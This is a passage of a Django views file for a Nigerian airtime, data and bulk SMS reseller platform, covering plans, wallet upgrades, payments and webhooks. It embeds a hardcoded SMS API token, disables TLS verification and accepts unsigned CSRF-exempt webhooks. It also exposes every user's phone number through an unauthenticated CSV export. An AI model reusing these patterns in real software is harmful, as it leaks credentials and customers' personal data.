                                    ab.DOB = DOB
                                    ab.Gender = Gender
                                    ab.State_of_origin = State_of_origin
                                    ab.Local_gov_of_origin = Local_gov_of_origin
                                    ab.BVN = BVN
                                    ab.passport_photogragh = passport_photogragh
                                    ab.comment = "BVN MATCHED WITH DETAILS"
                                    ab.dump = response.text
                                    ab.primary_details_verified = True
                                    ab.status= "processing"
                                    ab.save()
                                    return Response({"message": message}, status=201)
                                else:
                                    ab.dump = response.text
                                    ab.comment = "BVN NOT MATCH WITH DEATILS SUPPLIED"


                                    ab.save()
                                    comment = "BVN NOT MATCH WITH DEATILS"
                                    return Response({"message": "BVN NOT MATCH WITH DETAILS SUPPLIED"}, status=400)
                            else:
                                if First_Name.upper() == mydata['response']['data']['firstName'].upper() and Middle_Name.upper() == mydata['response']['data']['middleName'].upper() and Last_Name.upper() == mydata['response']['data']['lastName'].upper() and abd == mydata['response']['data']['dateOfBirth'] and Gender == mydata['response']['data']['gender'].upper():
                                    message = "Information submitted successful ,Your account verification in process"
                                    comment = "BVN MATCHED WITH DETAILS SUPPLIED"
                                    verify = True

                                else:
                                    comment = "BVN MATCHED WITH DETAILS SUPPLIED"
                                    message = "BVN MATCHED WITH DETAILS SUPPLIED"
                                    serializer.save(comment=comment, dump=response.text, primary_details_verified=verify)
                                    return Response({"response": message}, status=400)


                    else:
                                data = json.loads(response.text)
                                return Response(data,status = 400)

            elif  response.status_code == 500:
                            data = {
                                "status":"error",
                                "message": "something went wrong, please try again",
                                }
                            return Response(data,status = 500)
            else:
                        data = json.loads(response.text)
                        return Response(data,status = 400)

            serializer.save(comment=comment, dump=response.text, primary_details_verified=verify)

            return Response({"message": message}, status=201)
        return Response(serializer.errors, status=400)

"""




class GetNetworkAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
            mtn = Network.objects.get(name="MTN")
            glo = Network.objects.get(name="GLO")
            airtel = Network.objects.get(name="AIRTEL")
            etisalat = Network.objects.get(name="9MOBILE")
            smile = Network.objects.get(name="SMILE")

            net_1 = NetworkSerializer(mtn)
            net_2 = NetworkSerializer(glo)
            net_3 = NetworkSerializer(airtel)
            net_4 = NetworkSerializer(etisalat)
            net_5 = NetworkSerializer(smile)

            mtn_plans = Plan.objects.filter(network=mtn).order_by('plan_amount').values()
            glo_plans = Plan.objects.filter(network=glo).order_by('plan_amount').values()
            airtel_plans = Plan.objects.filter(network=airtel).order_by('plan_amount').values()
            mobile_plans = Plan.objects.filter(network=etisalat).order_by('plan_amount').values()
            smile_plans = Plan.objects.filter(network=smile).order_by('plan_amount').values()

            return JsonResponse({
                'MTN': {"network_info": net_1.data, "data_plans":list(mtn_plans)},
                'GLO': {"network_info": net_2.data, "data_plans":list(glo_plans)},
                'AIRTEL': {"network_info": net_3.data, "data_plans":list(airtel_plans)},
                '9MOBILE': {"network_info": net_4.data, "data_plans":list(mobile_plans)},
                'SMILE': {"network_info": net_5.data, "data_plans":list(smile_plans)},
            }, status=200)


class GetCablePlanAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):

            startime = CablePlan.objects.filter(cablename__name="STARTIME").order_by('plan_amount').values()
            gotv = CablePlan.objects.filter(cablename__name="GOTV").order_by('plan_amount').values()
            dstv = CablePlan.objects.filter(cablename__name="DSTV").order_by('plan_amount').values()

            return JsonResponse({
                'GOTV': {'cable_id':Cable.objects.get(name="GOTV").id, "plans":list(gotv)},
                'DSTV': {'cable_id':Cable.objects.get(name="DSTV").id, "plans":list(dstv)},
                'STARTIME': {'cable_id':Cable.objects.get(name="STARTIME").id, "plans":list(startime)},
            }, status=200)



class GetDiscoAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):

            disco = Disco_provider_name.objects.all().values()

            return JsonResponse({
                'plans': list(disco),
            }, status=200)





class available_recharge(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        info = ""
        if Info_Alert.objects.all():
            info = [x.message for x in Info_Alert.objects.all()[:1]][0]

        data = {
            "mtn": Recharge_pin.objects.filter(network=Network.objects.get(name="MTN")).filter(available=True).count(),
            "glo": Recharge_pin.objects.filter(network=Network.objects.get(name="GLO")).filter(available=True).count(),
            "airtel": Recharge_pin.objects.filter(network=Network.objects.get(name="AIRTEL")).filter(available=True).count(),
            "9mobile": Recharge_pin.objects.filter(network=Network.objects.get(name="9MOBILE")).filter(available=True).count(),
            "balance":request.user.Account_Balance,
            "info": info
        }

        return Response(data)



def Faqs(request):
    faq_question = frequentlyAskedQuestion.objects.order_by('pk')
    context = {'question':faq_question}
    return render(request, 'faq.html', context)


def RetailWebFaqs(request):
    faq_question = RetailWebFrequentlyAskedQuestion.objects.order_by('pk')
    context = {'question':faq_question}
    return render(request, 'faq2.html', context)



class UpgradeUserAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self,request):
        package = request.GET.get('package', None)

        if request.user.user_type == "Affilliate":
            amount= 500
            bonus = 250
        elif package == "Affilliate":
               amount = 1500
               bonus = 500
        else:
               amount = 1500
               bonus = 500


        if  package == request.user.user_type:
            data = {'message': "You cannot upgrade to your current package"}
            return Response(data,status=400)

        elif request.user.user_type == "TopUser" and package == "Affilliate":
            data = {'message': "You cannot upgrade to lower package to your current package"}
            return Response(data,status=400)

        elif amount > request.user.Account_Balance:
            data = {'message': "Insufficient Balance please fund your wallet and try to upgrade"}
            return Response(data,status=400)


        previous_bal = request.user.Account_Balance
        p_level = request.user.user_type
        request.user.user_type = package
        request.user.save()
        withdraw = request.user.withdraw(request.user.id, float(amount))
        if withdraw == False:
            data = {'message': "Insufficient Balance please fund your wallet and try to upgrade"}
            return Response(data,status=400)

        #try:
        Upgrade_user.objects.create(user=request.user, from_package=p_level, to_package=package,amount=f"{amount}", previous_balance=previous_bal, after_balance=(previous_bal - amount))
        if request.user.referer_username:
            if CustomUser.objects.filter(username__iexact=request.user.referer_username).exists():
                referer = CustomUser.objects.get(username__iexact=request.user.referer_username)
                referer.ref_deposit(bonus)
                notify.send(referer, recipient=referer, verb='N{} {} Upgarde Bonus from  {} your referal has been added to your referal bonus wallet'.format(
                    bonus,package,request.user.username))

        # except:
        #     data = {'message': "Something went wrong"}
        #     return Response(data,status=400)

        message = f"Your account has beeen succesfully upgraded from {p_level} to {package} package, balance before upgrade N{previous_bal} and balance after upgrade N{previous_bal - amount}"
        Wallet_summary.objects.create(user=request.user, product=f"Your account has beeen succesfully upgraded from {p_level} to Affilliate package, balance before upgrade N{previous_bal} and balance after upgrade N{previous_bal - amount}", amount=amount, previous_balance=previous_bal, after_balance=previous_bal - amount)

        data = {'message': message, }
        return Response(data,status=200)



class Wallet_summaryListView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = Wallet_summary.objects.filter(user=request.user).order_by('-create_date')[:500]
        # items = Wallet_summary.objects.filter(user=request.user).order_by('-create_date')

        serializer = Wallet_summarySerializer(items, many=True)
        return Response(serializer.data)




class ReferalListView(APIView):
    permission_classes = (IsAuthenticated,)
    def get(self, request, format=None):
        items = Referal_list.objects.filter(user=request.user).order_by('id')
        serializer = Referal_listSerializer(items, many=True)
        return Response(serializer.data)





class BankpaymentAPIView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request, format=None):
        items = Bankpayment.objects.filter(user=request.user).order_by('-create_date')
        serializer = seria2.serialize('json', items)

        data = [x["fields"] for x in json.loads(serializer)]
        return Response(data)

    def post(self, request, format=None):
           status = "processing"
           fund = 0
           data = request.data

           user = request.user
           bank_paid_to =  request.data["bank_paid_to"]
           Reference =  request.data["Reference"]
           amount =  request.data["amount"]

           Bankpayment.objects.create(user=user,Bank_paid_to=bank_paid_to ,Reference=Reference,amount=amount)

           try:
                sendmessage('Msorg', "{} want to fund his/her account with  bank payment  amount:{}  bank paid to {} https://www.yuniqtelecoms.com/404/page-not-found-error/page/app/bankpayment/".format(user.username, amount,bank_paid_to), f"{config.sms_notification_number}", '2')
           except:
                pass

           return Response({'message':"Bank Notification submitted successful"}, status=200)



class RetailerWebsiteAPI(APIView):
    permission_classes = (IsAuthenticated,)

    def post(self, request, format=None):
        print(request.body)
        domain = request.data["domain"]
        address = request.data["address"]
        phone = request.data["phone"]
        amount = 40000
        print(domain)

        if amount > request.user.Account_Balance:
            return Response({"error":"insufficient balance"}, status=400)

        else:
            p_level = request.user.user_type
            withdraw = request.user.withdraw(request.user.id, amount)
            if withdraw == False:
                return Response({"error":"insufficient balance"}, status=400)

            request.user.user_type = "TopUser"
            request.user.save()

            try:
                Wallet_summary.objects.create(user=request.user, product=f"Affillite Website  ", amount=amount,
                                          previous_balance=request.user.Account_Balance, after_balance=request.user.Account_Balance - amount)
            except:
                pass

            try:


                if request.user.referer_username:
                    if CustomUser.objects.filter(username__iexact=request.user.referer_username).exists():
                        referer = CustomUser.objects.get(username__iexact=request.user.referer_username)
                        referer.ref_deposit(3000)
                        notify.send(referer, recipient=referer, verb='N3000 TopUser Upgarde Bonus from  {} your referal has been added to your referal bonus wallet'.format(
                            request.user.username))

            except:
                pass

            try:
                TopuserWebsite.objects.create(user=request.user,Domain_name=domain,amount=amount,Offices_Address=address,Website_Customer_Care_Number=phone,SSL_Security=True)
            except:
                return Response({"error":"something went wrong pls contact admin "}, status=400)

        return Response({"success":"Your website order has submitted successful will contact you when the website is ready"}, status=200)

class BulkSmsAPIListView(APIView):
    permission_classes = (IsAuthenticated,)

    def get(self, request):

        queryset = Bulk_Message.objects.all()
        data = serializers.serialize("json", queryset)
        return Response(data)

class BulkSmsAPIView(APIView):
    permission_classes = (IsAuthenticated,)
    
    def get(self, request, format=None):
        items = Bulk_Message.objects.filter(user=request.user).order_by('-create_date')
        serializer = Bulk_MessageSerializer(items, many=True)
        return Response(serializer.data)

    def post(self, request):
               
            numbers = request.data.get("recetipient")
            message = request.data.get("message")
            sendername = request.data.get("sender")
            DND = request.data.get("DND")
            
            num = numbers.split(',')
            invalid = 0
            unit = 0
            numberlist = []
            page = 1
            previous_bal = request.user.Account_Balance
            charge = 1.8
            
            def sendmessage(sender, message, to, route):
                    payload = {
                        'sender': sender,
                        'to': to,
                        'message': message,
                        'type': '0',
                        'routing': route,
                        'token': 'cYTj0CCFuGM4PSrvABkoANCBNlNF2SoipZFSNlz5hmKnejg6fubGLFu7Ph2URDj22dWGYjlRqDILQz7kHxARBlAwdC4CpTKHGC5D',
                        'schedule': '',
                    }
        
                    baseurl = f'https://sms.hollatags.com/api/send/?user={config.hollatag_username}&pass={config.hollatag_password}&to={to}&from={sender}&msg={urllib.parse.quote(message)}'
                    response = requests.get(baseurl, verify=False)
                    return response

            def send_vtpass(sender, to, msg):
                url = f"https://messaging.vtpass.com/api/sms/dnd-route?sender={sender}&recipient={to}&message={msg}&responsetype=json"

                payload={}
                headers = {
                    'X-Token': str(config.vtpass_token),
                    'X-Secret': str(config.vtpass_SK),
                }

                response = requests.request("GET", url, headers=headers, data=payload)

                print(response.text)

            def send_bulksms9ja(sender, to, message):
                print('------------------------------------------------GOING TO BULKSMS 9JA')
                
                url = "https://www.bulksmsnigeria.com/api/v1/sms/create"
                payload = json.dumps({
                "api_token": str(config.bulksms9ja_api_token),
                "from": sender,
                "to": to,
                "body": message
                })

                # add this to send to custom sender name, but user must have completed kyc
                # "dnd":6   (default = 1)

                headers = {'Content-Type': 'application/json'}
                
                response = requests.request("POST", url, headers=headers, data=payload)
                print(payload)
                print(response.text)
                
                return response
                    
                    
            for real in num:

                if len(real) == 11:
                    if real.startswith('0'):
                        sender = list(real)
                        sender[0] = "234"
                        sender = ''.join(sender)
    
                        numberlist.append(sender)
    
                        unit += 1
                    else:
                        invalid += 1
    
                elif len(real) == 13:
                    if real.startswith('234'):
                        numberlist.append(real)
    
                        unit += 1
    
                    else:
                        invalid += 1
                else:
                    invalid += 1
    
            numberset = ','.join(numberlist)
            total = len(numberlist)
            
            if DND == True:
                charge = 3.5
                
                
            
                    
            if len(message) >= 1 and len(message) <= 160:
                 page = 1
            elif len(message) >= 161 and len(message) <= 304:
                 page = 2
            elif len(message) >= 305 and len(message) <= 454:
                 page = 3
            elif len(message) >= 455 and len(message) <= 605:
                 page = 4
            elif len(message) >= 606 and len(message) <= 755:
                 page = 5
            elif len(message) >= 756 and len(message) <= 905:
                 page = 6
            else :
                  message =  message[:905]
                  page = 6
                          
            if numberset == "" or numberset == None:
                return Response({"error": "No valid Number found"}, status=400)
                

            elif Disable_Service.objects.get(service="Bulk sms").disable == True:
                return Response({"error": 'This Service is not currently available please check back'}, status=400)
                

            else:

                if total * charge * page > request.user.Account_Balance:
                    return Response({"error": 'You can\'t send bulk sms  due to insufficientr balance'}, status=400)
                    
                
                else:
                    response = sendmessage(sendername, message, numberset, "03")
                    if response.text != "sent":
                        return Response({"error": 'Message could not be sent '}, status=400)

                        


                    else:
                               

                                amount = total * charge * page
                                
                                withdraw = request.user.withdraw(request.user.id, amount)
                                if withdraw == False:
                                    return Response({"error": 'You can\'t send bulk sms  due to insufficientr balance'}, status=400)
                                    
                                status = 'successful'
                                Wallet_summary.objects.create(user=request.user, product="bulk sms service charge  N{} ".format(
                                    amount), amount=amount, previous_balance=previous_bal, after_balance=(previous_bal - amount))
                                    
                                Bulk_Message.objects.create(user=request.user,unit=unit,invalid=invalid,total=total,page=page,amount=amount,sendername=sendername,message=message,to=numberset,DND = DND)
                                return Response({"error": 'Message succesfully sent '}, status=200)
                   


@require_POST
@csrf_exempt
def Vtpass_Webhook(request):
    print('------------------------------------------- VTPASS WEBHOOOK ----------------------------------')
    data = request.body
    print(f'data = {data}')
    
    forwarded_for =  u'{}'.format(request.META.get('HTTP_X_FORWARDED_FOR'))
    result = json.loads(data)
    print(f'result = {result}')
    
    return Response({"response": 'success'}, status=200)
    
 

@require_POST


# SAMPLE
# {
#   "transaction": {
#     "status": "success",
#     "reference": "46634e8384c7c68f5baa",
#     "customer_reference": "38dhdhdsk",
#     "type": "Data purchase",
#     "beneficiary": "090XXXXXXXX",
#     "memo": "500MB (SME) - Monthly data purchase for 090XXXXXXXX",
#     "response": "500MB (SME) - Monthly data purchase for 090XXXXXXXX",
#     "price": "200"
#   }
# }


@require_POST
@csrf_exempt
def smeplug_webhook(request):
    data = request.body
    result = json.loads(data)

    print(' ')
    print('................RECIEVED FROM SMEPLUG................')
    print("result = ", result)

    print(result['transaction']['customer_reference'])
    print(result['transaction']['status'])
    
    try:
        
            if result['transaction']['customer_reference'].startswith("DATA"):
                      dataorder = Data.objects.get(ident = result['transaction']['customer_reference'])
                      if dataorder.Status != 'failed':
                            if result['transaction']['status'] != 'success':
                                dataorder.Status = 'failed'
                                dataorder.save()
                                
                      
            elif result['transaction']['customer_reference'].startswith("AIRTIME"):
                              airtimeorder = AirtimeTopup.objects.get(ident = result['transaction']['customer_reference'])
                              if airtimeorder.Status != 'failed':
                                    if result['transaction']['status'] != 'success':
                                        airtimeorder.Status = 'failed'
                                        airtimeorder.save()
                                            
    except:                   
              pass
        
        
    return HttpResponse(status=200)       
        


import csv
def export_users_phone_number(request):
    response = HttpResponse(content_type='text/csv')
    response['Content-Disposition'] = 'attachment; filename="users.csv"'

    writer = csv.writer(response)
    writer.writerow(['username','Phone'])

    users = CustomUser.objects.all().values_list('username','Phone')
    for user in users:
        writer.writerow(user)

    return response        





def APIDocumentation(request):
    webhook = request.POST.get("webhook")
    validate = URLValidator()
    
    if request.method == "POST":
            try:
                validate(webhook)
                request.user.webhook = webhook
                request.user.save()
                messages.error(request,"Webhook Url saved succesfully",)
                return HttpResponseRedirect(request.META.get("HTTP_REFERER"))
                
                
            except ValidationError as exception:
                 messages.error(request,"Oops Invalid URl enetered",)
                 return HttpResponseRedirect(request.META.get("HTTP_REFERER"))
    
    if Token.objects.filter(user=request.user).exists():
            tokenv = Token.objects.get(user=request.user)
    else:
            Token.objects.create(user=request.user)
            tokenv = Token.objects.get(user=request.user)


    context = {
        'token':tokenv,
        'plans':Plan.objects.all().order_by('network__name'),
        'network':Network.objects.all(),
        'cableplans':CablePlan.objects.all(),
        'cable':Cable.objects.all(),
        'disco':Disco_provider_name.objects.all()
    }   

    return render(request, 'swagger-ui.html', context)
    





def selfCenter(request):
    if request.is_ajax():
        transaction_type = request.GET['type']
        reference = request.GET['ref']
        
        status = False
        reciept_id = None

        if transaction_type.upper() == "AIRTIME":
            qs = AirtimeTopup.objects.filter(ident = reference, user=request.user)
            if qs.exists():
                x = qs.first()
                resp = x.requery()['msg']
                status = x.requery()['valid']
                reciept_id = x.id
            else:
                resp = f"Airtime TopUp Transaction matching query(id: {reference}) does not exist, or the ID belongs to another user" 
        
        elif transaction_type.upper() == "DATA":
            qs = Data.objects.filter(ident = reference, user=request.user)
            if qs.exists():
                x = qs.first()
                resp = x.requery()['msg']
                status = x.requery()['valid']
                reciept_id = x.id
            else:
                resp = f"Data Transaction matching query(id: {reference}) does not exist, or the ID belongs to another user" 
        
        elif transaction_type.upper() == "CABLE": 
            qs = Cablesub.objects.filter(ident = reference, user=request.user)
            if qs.exists():
                x = qs.first()
                resp = x.requery()['msg']
                status = x.requery()['valid']
                reciept_id = x.id
            else:
                resp = f"Cable Subscription Transaction matching query(id: {reference}) does not exist, or the ID belongs to another user" 
        
        elif transaction_type.upper() == "BILL":
            qs = Billpayment.objects.filter(ident = reference, user=request.user)
            if qs.exists():
                x = qs.first()
                resp = x.requery()['msg']
                status = x.requery()['valid']
                reciept_id = x.id
            else:
                resp = f"Bill Payment Transaction matching query(id: {reference}) does not exist, or the ID belongs to another user" 
        else:
            resp = f"Transaction matching query(id: {reference}) does not exist, or the ID belongs to another user" 
        
        data = {'message': resp, "valid":status, "id":reciept_id}
        return JsonResponse(data)
        
    else:
        return render(request, 'selfhelp.html')
    
    
    



# @require_POST
# @csrf_exempt
def msorgWebsite_Webhook(request):
    logging.info('------------------------------------------- MSORG  WEBHOOOK ----------------------------------  (logging.info)')
    data = request.body
    # result = json.loads(data)
    print('this is for console only')

    logging.debug('this is (logging.debug)')
    logging.warning('hey hameed - (logging.warning)')
    logging.error('yo! - (logging.error) ')
    logging.critical('hi - (logging.critical)')




    return HttpResponse(status=200)



@require_POST
@csrf_exempt
def ussdhost_webhook(request):
    print('------------------------------------------- USSD SIMHOSITNG WEBHOOOK ----------------------------------')
    data = request.body
    print(f'data = {data}')
    
    """
    {
      "code":"20000000000",
      "servername":"MTN Server",
      "refid":"abcde01234",
      "ussd":"*556#",
      "reply":"Your balance is N28.08."
    }
    """
    
    try:
        result = json.loads(data)
        print(f'result = {result}')
    except:
        pass
    
    return HttpResponse(status=200)
    





